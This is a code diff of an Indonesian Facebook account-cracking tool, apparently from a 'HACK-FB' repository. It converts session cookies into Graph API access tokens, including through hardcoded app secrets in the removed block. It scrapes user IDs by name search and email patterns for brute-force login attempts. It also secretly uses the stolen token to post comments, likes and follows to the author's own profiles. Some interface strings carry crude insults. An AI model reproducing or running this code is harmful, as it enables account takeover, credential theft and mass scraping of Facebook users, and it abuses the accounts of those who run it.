@@ -241,17 +241,17 @@ for x in range(10):
 	e=random.randrange(40,150)
 	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
 def uaku():
-	try:
-		ua=open('__ua.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/Rudal-XD/HACK-FB/blob/main/bbnew.txt').text
-		ua=open('__ua.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('__ua.txt','r').read().splitlines()
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            free.append(ub)
+    except:
+        a=requests.get('https://github.com/Rudal-XD/HACK-FB/blob/main/bbnew.txt').text
+        ua=open('bbnew.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n')
+        ua=open('bbnew.txt','r').read().splitlines()
 #------------[ INDICATION ]---------------#
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
@@ -324,16 +324,27 @@ bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+hour = datetime.datetime.now().hour
+#--> Pengkondisian Jam Untuk Salam Harian
+if hour < 4:
+  hhl = f"Selamat Dini Hari"
+elif 4 <= hour < 12:
+  hhl = f"Selamat Pagi"
+elif 12 <= hour < 15:
+  hhl = "Selamat Pagi"
+elif 15 <= hour < 17:
+  hhl = f"Selamat Sore"
+elif 17 <= hour < 18:
+  hhl = f"Selamat Sore"
+else:
+  hhl = f"Selamat Malam"
 #------------------[ MACHINE-SUPPORT ]---------------#
-def alvino_xy(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
 def clear():
 	os.system('clear')
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
     Console().print(Panel("""
-      [bold green]Fanky[bold white]
-[bold red]███████████████████████             
+[bold red]███████████████████████    
 [bold red]███████████████████████          [bold yellow]Github    : [bold green]https://github.com/Rudal-XD
 [bold red]███████████████████████          [bold yellow]Wa        : [bold green]+62895386194***
 [bold white]███████████████████████          
@@ -345,19 +356,15 @@ def banner():
 def login123():
 	os.system('clear')
 	banner()
-	Console().print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie EAAT (Recomend)\n[bold white][[bold cyan]02[bold white]] Login Menggunakan Cookie EAAB (not recomend)\n[[bold cyan]03[bold white]] Keluar
+	Console().print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie EAAT (Recomend)\n[[bold cyan]02[bold white]] Keluar
     """,width=80, style=f"{color_panel}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (LOGIN) [bold green]<[bold yellow]<[bold red]<"))
 	bryn = console.input(f" {H2}• {P2}pilih menu : ")
 	if bryn in ['1','01']:
 		login_lagi334()
 	elif bryn in ['2','02']:
-		login_lagi335()
-	elif bryn in ['3','03']:
 		exit()
-	elif bryn in ['4','04']:
-		login_lagi336()
 	else:
-		Console().print("[bold cyan]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r')
+		Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end='\r')
 		time.sleep(5)
 		login()
 		
@@ -374,7 +381,7 @@ def login():
 		except KeyError:
 			login123()
 		except requests.exceptions.ConnectionError:
-			Console().print("[bold cyan]   ╰─>[bold red] Problem Internet Connection, Check And Try Again")
+			Console().print(f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again")
 			exit()
 	except IOError:
 		login123()
@@ -396,7 +403,7 @@ def login_lagi334():
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					console.print(f" {H2}• {P2}Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
@@ -431,8 +438,7 @@ def login_lagi334():
 							Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]>[hot_pink2] (PILIHAN) [bold green]<"))
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5)
-							time.sleep(3)
+							Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
 							try:
 								cookie = {'cookie':your_cookies}
 								with requests.Session() as xyz:
@@ -443,353 +449,27 @@ def login_lagi334():
 									roq = xyz.get(nek,cookies=cookie)
 									tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
 									open(".token1.txt","w").write(tok)
-									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
+									followdong()
 									back()
 							except Exception as e:
 								print(e)
 			except Exception as e:
-				Console().print(f"[bold cyan]   ╰─>[bold red] Cookies Mokad Bang")
+				Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
 				exit()
 	except:pass
 
-
-
-def login_lagi336():
-	try:
-		Console().print(Panel("""[bold white]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account""",width=80,style=f"{color_panel}", title="SARAN"))
-		your_cookies = console.input(f" {H2}• {P2}Masukan Cookie : ")
-		with requests.Session() as r:
-			try:
-				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
-				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
-				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
-				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
-				else:
-					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
-					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
-					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
-					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
-					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
-						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
-						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
-						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
-						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
-						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
-						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
-						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
-						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
-						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
-						r.headers.update({'referer': 'https://m.facebook.com/',})
-						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
-						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
-							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
-							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]>[hot_pink2] (PILIHAN) [bold green]<"))
-							tokenew = open(".token.txt","w").write(access_token)
-							cook= open(".cok.txt","w").write(your_cookies)
-							Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5)
-							time.sleep(3)
-							back()
-			except Exception as e:
-				Console().print(f"[bold cyan]   ╰─>[bold red] Cookies Mokad Bang")
-				os.system('rm -rf .token.txt && rm -rf .cok.txt')
-				print(e)
-				time.sleep(3)
-				exit()
-	except:pass
-						
-
-
-
-def login_lagi335():
-	try:
-		os.system('clear')
-		banner() 
-		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'\n{x}[{h}+{x}] Masukkan Cookies :{asu} ')
-		cookies = {'cookie':cookie}
-		url = 'https://www.facebook.com/test-and-learn/test'
-		req = ses.get(url,cookies=cookies)
-		tok = re.search('{"accessToken":"(EAAF\w+)',req.text).group(1)
-		ken = open(".token.txt", "w").write(tok)
-		cok = open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}√{x}]{h} LOGIN BERHASIL KONTOL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
-		exit()
-	except Exception as e:
-		os.system("rm -f .token.txt")
-		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
-
-def login_lagi336():
-	try:
-		cookie=input("[•] Cookie : ")
-		headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
-		ses=requests.Session()
-		req = ses.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers,cookies={'cookie': cookie})
-		cari_id = re.findall('act=(.*?)&nav_source', req.text)
-		for bn in cari_id:
-			rex = ses.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={bn}&nav_source=no_referrer', headers = headers,cookies={'cookie': cookie})
-			token = re.search('(EAAB\w+)', rex.text).group(1)
-			ken=open(".token.txt", "w").write(token)
-			cok=open(".cok.txt", "w").write(cookie)
-		exit()
-	except Exception as e: 
-		os.system("rm -f .token.txt")
-		exit()
-
-
-import os, sys, requests, re, bs4
-from bs4 import BeautifulSoup as bs
-
-M = "\x1b[38;5;196m" # Merah
-J = "\x1b[38;5;208m" # Jingga
-H = "\x1b[38;5;46m"  # Hijau
-P = "\x1b[38;5;231m" # Putih
-
-def clear():
-    if "linux" in sys.platform.lower():
-        try:os.system("clear")
-        except:pass
-    elif "win" in sys.platform.lower():
-        try:os.system("cls")
-        except:pass
-    else:
-        try:os.system("clear")
-        except:pass
-
-def input_cookie():
-    print('%sApabila A2F On, Buka Link Dibawah, Lalu Masukkan Kode A2F'%(P))
-    print('%shttps://business.facebook.com/business_locations\n'%(P))
-    cookie = input('%sMasukkan Cookie : %s'%(P,J))
-    pilih  = input('\n%sGeneral%s/%sSpecific %sToken [%sg%s/%ss%s] : '%(H,P,M,P,H,P,M,P)).lower()
-    if pilih in ['1','01','g']: general_token(cookie)
-    elif pilih in ['0','02','s']: specific_token(cookie)
-    else: exit('\n%sIsi Yg Benar!%s'%(M,P))
-
-def general_token(cookie):
-    Token1 = generate_token_eaab(cookie); Perm1 = req_info_token(cookie,Token1) # Power Editor Token
-    Token2 = generate_token_eaag(cookie); Perm2 = req_info_token(cookie,Token2) # Business Manager Token
-    Token3 = generate_token_eaai(cookie); Perm3 = req_info_token(cookie,Token3) # Ads Management Token
-    Token4 = generate_token_eaad(cookie); Perm4 = req_info_token(cookie,Token4) # Ads Event Manager Token
-    Token5 = generate_token_eaaC(cookie); Perm5 = req_info_token(cookie,Token5) # Ads Block List Token
-    Token6 = generate_token_eaae(cookie); Perm6 = req_info_token(cookie,Token6) # Account Quality Token
-    Token7 = generate_token_eaaf(cookie); Perm7 = req_info_token(cookie,Token7) # Lift Study Creation Token
-    Token8 = generate_token_eabb(cookie); Perm8 = req_info_token(cookie,Token8) # Hub Materi Iklan Token
-    print('\n%s[ Power Editor Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'        %(P,J,Token1,P,H,Perm1,P))
-    print('\n%s[ Business Manager Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'    %(P,J,Token2,P,H,Perm2,P))
-    print('\n%s[ Ads Management Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'      %(P,J,Token3,P,H,Perm3,P))
-    print('\n%s[ Ads Event Manager Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'   %(P,J,Token4,P,H,Perm4,P))
-    print('\n%s[ Ads Block List Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'      %(P,J,Token5,P,H,Perm5,P))
-    print('\n%s[ Account Quality Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'     %(P,J,Token6,P,H,Perm6,P))
-    print('\n%s[ Lift Study Creation Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s' %(P,J,Token7,P,H,Perm7,P))
-    print('\n%s[ Hub Materi Iklan Token ]\n%s%s\n%s[ Permissions ]\n%s%s%s'    %(P,J,Token8,P,H,Perm8,P))
-
-def req_info_token(cooki,token):
-    try:
-        cookie = {'cookie':cooki}
-        url    = 'https://developers.facebook.com/tools/debug/accesstoken/?access_token=%s&version=v15.0'%(token)
-        with requests.Session() as xyz:
-            req = bs(xyz.get(url,cookies=cookie).content,'html.parser')
-            crf = req.find('a',href='/docs/reference/login/#permissions')
-            return(crf.text)
-    except Exception as e:
-        return('%sPermissions Not Available%s'%(M,P))
-
-def generate_token_eaab(cok): # Power Editor Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-            req = xyz.get(url,cookies=cookie)
-            set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
-            nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-            roq = xyz.get(nek,cookies=cookie)
-            tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eaag(cok): # Business Manager Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://business.facebook.com/business_locations'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eaai(cok): # Ads Management Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/ads/manager/billing_history/summary/'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('{access_token:"(.*?)"',req.text).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eaad(cok): # Ads Event Manager Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/events_manager2/overview'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('{"accessToken":"(EAAd\w+)',req.text).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eaaC(cok): # Ads Block List Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/brand_safety/controls'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('{"accessToken":"(EAAC\w+)',req.text).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eaae(cok): # Account Quality Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/accountquality/'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('"accessToken":"(EAAE\w+)',req.text).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eaaf(cok): # Lift Study Creation Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/test-and-learn/test'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('{"accessToken":"(EAAF\w+)',req.text).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-def generate_token_eabb(cok): # Hub Materi Iklan Token
-    try:
-        cookie = {'cookie':cok}
-        with requests.Session() as xyz:
-            url = 'https://www.facebook.com/ads/adbuilder/home'
-            req = xyz.get(url,cookies=cookie)
-            tok = re.search('"accessToken":"(EABB\w+)',req.text).group(1)
-            return(tok)
-    except Exception as e:
-        return('Cookies Invalid')
-
-class specific_token:
-    def __init__(self,cookie):
-        self.xyz    = requests.Session()
-        self.cookie = {'cookie':cookie}
-        app_id      = [
-            '1348564698517390|007c0a9101b9e1c8ffab727666805038', #--> Meta Portal
-            '1174099472704185|0722a7d5b5a4ac06b11450f7114eb2e9', #--> Messenger Kids for iOS
-            '155327495133707|a151725bc9b8808a800f4c891505e558' , #--> Facebook Watch for Oculus
-            '1331685116912965|e334a1eca4d4ea9ac0c0132a31730663', #--> Facebook Watch for Xbox
-            '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01' , #--> Facebook Watch for Amazon Fire TV
-            '437340816620806|04a36c2558cde98e185d7f4f701e4d94' , #--> Facebook Watch for Android TV
-            '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e' , #--> Facebook Watch for Apple TV
-            '1692575501067666|3168904bd42ebb12bf981327de99179f', #--> Facebook Watch for Samsung TV
-            ]
-        for x in app_id:
-            self.get_kode(x)
-    def get_kode(self,act):
-        data = {
-            'access_token': act,
-            'scope': ''}
-        req  = self.xyz.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
-        try:
-            cd, ucd = req['code'], req['user_code']
-            url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=%s'%(cd,act)
-            self.verify1(ucd,act)
-            self.get_token(url)
-        except Exception as e:
-            print('Login Gagal --> %s'%(act))
-    def verify1(self,ucd,act):
-        req = bs(self.xyz.get('https://mbasic.facebook.com/device',cookies=self.cookie).content,'html.parser')
-        raq = req.find('form',{'method':'post'})
-        dat = {
-            'jazoest'   : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
-            'fb_dtsg'   : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1),
-            'qr'        : '0',
-            'user_code' : ucd}
-        rel = 'https://mbasic.facebook.com' + raq['action']
-        pos = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
-        self.verify2(pos,ucd,act)
-    def verify2(self,req,ucd,act):
-        dat = {}
-        raq = req.find('form',{'method':'post'})
-        for x in raq('input',{'value':True}):
-            try:
-                if x['name'] == '__CANCEL__' :
-                    pass
-                else:
-                    dat.update({x['name']:x['value']})
-            except Exception as e:
-                pass
-        rel = 'https://mbasic.facebook.com' + raq['action']
-        pos = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
-        if 'Sukses!' in str(pos):
-            pass
-        else:
-            print('Login Gagal --> %s'%(act))
-    def get_token(self,url):
-        req = self.xyz.get(url,cookies=self.cookie).json()
-        tok = req['access_token']
-        self.req_info_token(tok)
-    def req_info_token(self,tok):
-        try:
-            url = 'https://developers.facebook.com/tools/debug/accesstoken/?access_token=%s&version=v16.0'%(tok)
-            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
-            try: gtx = req.find_all('tr')[0].find_all('td')[1].text
-            except Exception as e: gtx = 'App : Unknown'
-            try: crf = req.find('a',href='/docs/reference/login/#permissions').text
-            except Exception as e: crf = '%sPermissions Not Available%s'%(M,P)
-            print('')
-            print('%s[ %s ]%s'%(P,gtx,P))
-            print('%s%s%s'%(J,tok,P))
-            print('%s%s%s'%(H,crf,P))
-        except Exception as e:
-            pass
-		
 def followdong():
 	try:
 		token = open('.token.txt','r').read()
 		cokies = open('.cok.txt','r').read()
 	except IOError:
-		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
+		Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluarsa ")
 		time.sleep(5)
 		login()
 	myuid = ('100043537611609')
@@ -803,14 +483,14 @@ def followdong():
 #----------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
     try:
-        token = open('.token1.txt','r').read()
-        tokenmu.append(token)
+        tokenx = open('.token1.txt','r').read()
+        tokenmu.append(tokenx)
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
         requests.post("https://graph.facebook.com/878169396977639/likes?method=post&access_token=%s"%(tokenmu))
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenmu))
     except IOError:
-        Console().print("[bold cyan] ─>[bold red] Cookies Kadaluarsa ")
+        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa ")
         time.sleep(3)
         login()
     os.system('clear')
@@ -826,7 +506,7 @@ def menu(my_name,my_id):
     prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
     if HaHi in ['']:
-        print(f" {H2}• [bold red]Masukan Yang Bener Tolol!!! ")
+        console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
     elif HaHi in ['1','01']:
         publik()
     elif HaHi in ['2','02']:
@@ -850,18 +530,18 @@ def menu(my_name,my_id):
     elif HaHi in["LAIN","Lain","lain"]:
         Lain(cookie).menu()
     else:
-        exit(prints(Panel(f"{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya",width=80,style="{color_panel}")))
+        console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
 
 
 
 def crack_file():
 	try:vin = os.listdir('/sdcard/RUDAL-DUMP/')
 	except FileNotFoundError:
-		console.print(f' {H2}• {P2} File Tidak Ditemukan ')
+		console.print(f' {H2}• {P2}File Tidak Ditemukan ')
 		time.sleep(2)
 		exit()
 	if len(vin)==0:
-		console.print(f' {H2}• {P2} Kamu Tidak Memiliki File Dump ')
+		console.print(f' {H2}• {P2}Kamu Tidak Memiliki File Dump ')
 		time.sleep(2)
 		exit()
 	else:
@@ -895,24 +575,24 @@ def crack_file():
 			id.append(xid)
 		setting()
 
+
 def crack_nama():
-	nama = []
-	custom = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
-	custom2 = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
-	prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
-	nam = console.input(f" {H2}• {P2}masukan nama : ").split(",")
-	for ser in nam:		
-		for belakang in custom:
-			id = ser+belakang
-			nama.append(id)
-		for depan in custom2:
-			id = depan+ser
-			nama.append(id)
-	with tred(max_workers=5) as thread:
-		for id in nama:
-			Dump_Pencarian(f"https://mbasic.facebook.com/public/{id}")
-	setting()
-		
+    nama = []
+    custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
+    custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
+    cetak(panel(f"[bold white]Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=79,padding=(0,2),style=f"bold hot_pink2"))
+    nam = wa.input(f' {H2}• {P2}Masukan Nama : ').split(",")
+    for ser in nam:		
+        for belakang in custom:
+            id = ser+belakang
+            nama.append(id)
+        for depan in custom2:
+            id = depan+ser
+            nama.append(id)
+    with tred(max_workers=5) as thread:
+        for id in nama:
+            thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
+    setting()
 def cari_nama(link):
     r = parser(ses.get(str(link)).text,'html.parser')
     for x in r.find_all('td'):
@@ -927,29 +607,12 @@ def cari_nama(link):
             else:id.append(bo)
     link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
     if(link):
-        sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
+        sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
         time.sleep(0.0000003)
         cari_nama(link)
     else:
         print("\r")
-
-
-def Dump_Pencarian(url):
-    try:
-        data = parser(ses.get(str(url)).text,'html.parser')
-        for z in data.find_all("td"):
-            namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
-            for uid,nama in namp:
-                if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
-                elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
-                if uid+"<=>"+nama in tampung:pass
-                else:tampung.append(uid+"<=>"+nama)
-                console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-        for x in data.find_all("a",href=True):
-            if "Lihat Hasil Selanjutnya" in x.text:
-                Dump_Pencarian(x.get("href"))
-    except:pass
-
+	
 def clon_email():
 	rc = random.choice
 	rr = random.randint
@@ -974,18 +637,8 @@ def clon_email():
 		if len(dump)==2000:setting()
 		print('\r Sedang Dump %s id'%(len(dump)),end='')
 		sys.stdout.flush()
-	setting()
-	
-def Dump_Email(user,format,limit):
-    try:
-        for z in range(int(limit)):
-            if len(user.split()) > 1:
-                email = str(user.split()[0])+str(user.split()[1])+str(z)+str(format)+"<=>"+str(user.split()[0])+" "+str(user.split()[1])
-            else:
-                email = str(user)+str(z)+str(format)+"<=>"+str(user)
-                if email in tampung:pass
-                else:tampung.append(email)
-    except:pass
+	setting()	
+
 #-----------------[ CRACK GRUP ]-----------------# 
 def crack_group():
 	try:
@@ -1038,7 +691,7 @@ def pengikut2():
 		login()
 	ses = requests.Session()
